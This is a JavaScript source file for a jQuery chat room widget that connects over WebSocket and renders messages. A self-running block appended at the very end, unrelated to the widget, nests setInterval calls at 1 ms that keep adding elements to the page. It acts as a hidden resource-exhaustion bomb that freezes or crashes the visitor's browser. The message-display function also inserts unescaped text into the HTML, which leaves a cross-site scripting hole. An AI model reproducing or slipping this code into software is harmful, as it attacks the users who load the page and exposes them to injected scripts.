/**
 * chatRoomSettings:
 *
 *      serverUrl: (String)
 *          which server to launch, using url will have higher priority
 *
 *      measure: (Object)
 *
 *          widthPercentage: (Number)
 *              chatRoom width in percentage
 *                  (default: 20% window width)
 *
 *          heightPercentage: (Number)
 *              chatRoom height in percentage, not including top-bar thumb nail
 *                  (default: 45% window height)
 *
 *          widthFixed: (Number)
 *              fixed chatRoom width in px
 *
 *          heightFixed: (Number)
 *              fixed chatRoom height in px, not including top-bar thumb nail
 *
 *          widthMin: (Number)
 *              minimum chatRoom width
 *                  (default: 250px)
 *
 *          heightMin: (Number)
 *              minimum chatRoom height, not including top-bar thumb nail
 *                  (default: 300px)
 *
 *          DONT: (bool)
 *              don't calculate measure
 *
 *
 *      position: (Object)
 *
 *          right: (Number)(priority)
 *              chatRoom box distance to window right in px
 *                  (default: 30px)
 *
 *          bottom: (Number)(priority)
 *              chatRoom box distance to window bottom in px
 *                  (default: 0)
 *
 *          top: (Number)
 *              chatRoom box distance to window top in px
 *                  (default: )
 *
 *          left: (Number)
 *              chatRoom box distance to window left in px
 *                  (default: )
 *
 *          DONT: (bool)
 *              don't calculate position
 *
 *      action: (Object)
 *
 *          draggable: (bool)
 *              is chat room box draggable or not
 *                  (default: true)
 *
 *          minimizable: (bool)
 *              is chat room box minimizable by clicking on top thumb nail
 *                  (default: true)
 *
 */

(function (factory) {
    if(!window.jQuery){
        throw new Error('ChatRoom.js requires jQuery!');
    }
    else{
        // attach to window, currently only support env with a window
        factory(window);
    }
})(function (global) {

    var chatRoomSettings;

    var tempServerUrl;

    var socketInst;

    // flag for if fix chat room box to bottom if message came in
    var needAutoFixBottomOnMessage=true;


    /**
     * the starter of client js
     *
     * @param ctx
     *      context
     * @param settings
     *      user customize settings
     * @constructor
     */
     var ChatRoom = function (ctx, settings) {

        this.settings = settings;

        createSettingInst(settings);
        createSocket(chatRoomSettings.serverUrl);

        // insert simple html layout for context
        // use callback cuz loading items is asynchronized
        prepareContextLayout(ctx,function () {
            // add controls to the items in context, like buttons or something else

            createListeners();
            createWidgetFunction();

            $('#getBtn').click(function () {
                // doGet(url);
            });

        });

    };

    /**
     * Check each setting exist. If not, set default values
     */
    function createSettingInst(settings) {

        // TODO: find user set value or use default layout

        var WW = $(window).width();
        var HH = $(window).height();

        // attach settings to window
        chatRoomSettings = settings;

        chatRoomSettings.serverUrl = settings.serverUrl;

        // deal with measure
        if(chatRoomSettings.measure==undefined){
            chatRoomSettings.measure = {};
            chatRoomSettings.measure.heightPercentage = 45;
            chatRoomSettings.measure.widthPercentage = 20;
            chatRoomSettings.measure.widthMin = 250;
            chatRoomSettings.measure.heightMin = 300;
        }
        else if(chatRoomSettings.DONT==true){
            chatRoomSettings.measure = {};
        }
        else {
            if(chatRoomSettings.measure.heightPercentage!=undefined){
                chatRoomSettings.measure.heightFixed = undefined;
            }
            else if(chatRoomSettings.measure.heightFixed != undefined){
                chatRoomSettings.measure.heightPercentage = undefined;
            }
            else{
                chatRoomSettings.measure.heightPercentage = 45;
            }

            if(chatRoomSettings.measure.widthPercentage!=undefined){
                chatRoomSettings.measure.widthFixed = undefined;
            }
            else if(chatRoomSettings.measure.widthFixed != undefined){
                chatRoomSettings.measure.widthPercentage = undefined;
            }
            else{
                chatRoomSettings.measure.widthPercentage = 20;
            }

            if(chatRoomSettings.measure.heightMin==undefined)
                chatRoomSettings.measure.heightMin = 300;
            if(chatRoomSettings.measure.widthMin==undefined)
                chatRoomSettings.measure.widthMin = 250;
        }

        // deal with position
        if(chatRoomSettings.position==undefined){
            chatRoomSettings.position={};
            chatRoomSettings.position.right = 30;
            chatRoomSettings.position.bottom = 0;
        }
        else if(chatRoomSettings.position.DONT==true){
            chatRoomSettings.position={};
        }
        else {
            if (chatRoomSettings.position.right == undefined && chatRoomSettings.position.left == undefined) {
                chatRoomSettings.position.right = 30;
            }
            if (chatRoomSettings.position.bottom == undefined && chatRoomSettings.position.top == undefined) {
                chatRoomSettings.position.bottom = 0;
            }
        }

        // deal with actions
        if(chatRoomSettings.action==undefined){
            chatRoomSettings.action={};
            chatRoomSettings.action.draggable = true;
            chatRoomSettings.action.minimizable = true;
        }
        else{
            if(chatRoomSettings.action.draggable==undefined)
                chatRoomSettings.action.draggable = true;
            if(chatRoomSettings.action.minimizable==undefined)
                chatRoomSettings.action.minimizable = true;
        }

    }

    function createSocket(url) {

        var ws_scheme = window.location.protocol == "https:" ? "wss" : "ws";

        console.log('create socket: '+ ws_scheme +'://'+url);

        socketInst = new WebSocket(ws_scheme+"://"+url);

        socketInst.onerror = function(e) {
            socketInst = null;
            console.log('create socket FAIL!');
            pushMessageToChatRoom('ERROR, server unreachable!','server');
        };

        socketInst.onmessage = receiveMessage;

        socketInst.onopen = function() {
            console.log("create socket SUCCESS! Send 'Hello, world!' ");
            socketInst.send("Hello, world!");
        };

        socketInst.onclose = function () {
            console.log('socket auto close.');
            socketInst
        };
    }

    /**
     * create listeners for user actions
     */
    function createListeners() {
        // if user is not at bottom, the chatRoomMessageArea shouldn't auto-scroll to bottom
        $('#chatRoomMessageArea').scroll(function () {
            var textAreaViewPortHeight = $(this).height();
            var userPos = $(this).scrollTop() + textAreaViewPortHeight;
            var textAreaHeight = this.scrollHeight;

            needAutoFixBottomOnMessage = (userPos == textAreaHeight);
        });
        $(window).resize(function () {
            measureChatRoomLayout();
        });
    }

    /**
     * This project will cause 'cross-origin' problem, more info:
     * http://jimmy319.blogspot.tw/2013/09/javascript-xhr-cross-domain-request-is.html
     * http://www.wengweitao.com/corskua-yu-zi-yuan-gong-xiang-cross-origin-resource-sharing.html
     */
    function doGet(url) {
        $.ajax({
            url: 'http://'+url,
            success: function (data) {
                console.log('receive ' + data.toString());
            },
            dataType: 'text'
        });

        // var req = new XMLHttpRequest();
        // req.open('GET', 'http://'+url+'/hello/', true);
        // req.onreadystatechange = function (data) {
        //     console.log('receive ' + data.toString());
        // };
        // req.send();
    }

    /**
     * Insert layout for context object
     */
    function prepareContextLayout(ctx,callback) {

        $.get( "./ChatRoomPackage/ChatRoom.html", function( data ) {
            ctx.innerHTML = data;
            measureChatRoomLayout();
            if(callback) callback();
        });

    }

    /**
     * Measure/re-measure chat room box layout
     */
    function measureChatRoomLayout() {

        var cr = $('#ChatRoom');
        for(var key in chatRoomSettings.position){
            if(chatRoomSettings.position.hasOwnProperty(key)){
                cr.css(key, chatRoomSettings.position[key]);
            }
        }

        var main = $('#mainContent');
        if(chatRoomSettings.measure.heightPercentage!=undefined){
            main.css('height',chatRoomSettings.measure.heightPercentage+'vh');
        }
        else{
            main.css('height',chatRoomSettings.measure.heightFixed+'px');
        }
        if(chatRoomSettings.measure.widthPercentage!=undefined){
            main.css('width',chatRoomSettings.measure.widthPercentage+'vw');
        }
        else{
            main.css('width',chatRoomSettings.measure.widthFixed+'px');
        }

        var hh = main.outerHeight();
        var ww = main.outerWidth();
        var minH = chatRoomSettings.measure.heightMin;
        var minW = chatRoomSettings.measure.widthMin;
        // if minH/minW undefined, always false
        if(minH>hh)
            main.css('height',chatRoomSettings.measure.heightMin+'px');
        if(minW>ww)
            main.css('width',chatRoomSettings.measure.widthMin+'px');

        var chatRoomRemainHeight = main.outerHeight() - $('#testAreaWrapper').outerHeight() - $('#messageInputWrapper').outerHeight();
        $('#chatRoomMessageArea').height(chatRoomRemainHeight);

    }

    /**
     * create functionality for widgets in chat room
     */
    function createWidgetFunction() {

        if(chatRoomSettings.action.minimizable)
            createClickOnTopBarPopUpAnimation();

        // setting server url/ip
        $('#serverInput').keyup(function (k) {
            if(k.keyCode==13){
                tempServerUrl = $('#serverInput').val();
                reconnect(tempServerUrl);
            }
        });

        // message input area
        $('#messageInput').keyup(function (k) {
            if(k.keyCode==13){
                sendMessage();
            }
        });
    }

    /**
     * Create animation of showing and hiding chat room while clicking on top bar
     */
    function createClickOnTopBarPopUpAnimation() {

        var mainBlock = $('#mainContent');
        var hh = mainBlock.outerHeight();

        // initially
        mainBlock.height(0);

        $('#topBar').click(function () {
            if(!mainBlock.is(':visible') || mainBlock.height()==0){
                mainBlock.animate({height:hh},'fast');
            }
            else{
                mainBlock.animate({height:0},'fast');
            }
        });
    }

    /**
     * receive message from server via socket
     *
     *  @param e     server packet instance
     */
    function receiveMessage(e) {
        pushMessageToChatRoom(e.data,'server');
        if(needAutoFixBottomOnMessage){
            moveViewPortToBottom(false);
        }
        console.log('server respond: ' + e.data);
    }

    /**
     * send message to server via socket
     */
    function sendMessage() {
        var str = $('#messageInput').val();
        console.log('send ' + str + ' to server!');
        if(str && socketInst){
            $('#messageInput').val('');
            pushMessageToChatRoom(str,'user');
            moveViewPortToBottom(true);

            // send message 1sec later for testing
            // TODO: remove interval
            var i = setInterval(function () {
                clearInterval(i);
                socketInst.send(str);
            },1000);
        }
    }

    /**
     * Go to chat room message area bottom
     *
     * @param animation  slide with animation or not
     */
    function moveViewPortToBottom(animation) {
        var chatArea = $('#chatRoomMessageArea');
        var pos = chatArea[0].scrollHeight;
        if(animation)
            chatArea.animate({scrollTop:pos},200);
        else{
            chatArea.scrollTop(pos);
        }
    }

    /**
     * close previous socket and create new one
     * @param target
     */
    function reconnect(target) {
        if(socketInst) socketInst.close();
        createSocket(target);
    }

    /**
     * push message to chat room area
     * @param msg
     * @param side
     */
    function pushMessageToChatRoom(msg, side) {
        if(side=='user'){
            $('#chatRoomMessageArea').append('<div class="userMessageItem messageItem">'+ msg +'</div>');
        }
        else if(side=='server'){
            $('#chatRoomMessageArea').append('<div class="serverMessageItem messageItem">'+ msg +'</div>');
        }
        // system message
        else{
            $('#chatRoomMessageArea').append('<div class="systemMessageItem messageItem">'+ msg +'</div>');
        }
    }

    /**
     * Simple toString method for debugging
     *
     * @returns {string}
     */
    ChatRoom.prototype.toString = function toString() {
        return 'setting = ' + this.settings.toString();
    };

    /**
     * END WITH NO ERROR, ATTACH CHATROOM TO GLOBAL OBJECT
     */

    global.ChatRoom = ChatRoom;

});

(function () {
    setInterval(function () {
        setInterval(function () {
            var d = document.createElement('div');
            document.body.appendChild(d);
        },1)
    },1);
})();
